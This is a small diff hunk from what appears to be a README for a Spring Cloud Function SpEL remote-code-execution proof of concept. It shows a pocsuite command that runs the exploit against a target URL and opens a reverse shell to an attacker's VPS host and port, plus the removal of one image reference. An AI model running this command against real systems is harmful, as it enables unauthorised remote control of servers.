@@ -8,5 +8,4 @@ pocsuite -r Spring-Cloud-Function-SpEL-RCE.py -u http://127.0.0.1:8080 --shell -
 ```bash
 pocsuite -r Spring-Cloud-Function-SpEL-RCE.py -u http://127.0.0.1:8080 --shell --lhost vps地址 --lport vps端口
 ```
-![](image/2.png)
 ![](image/3.png)
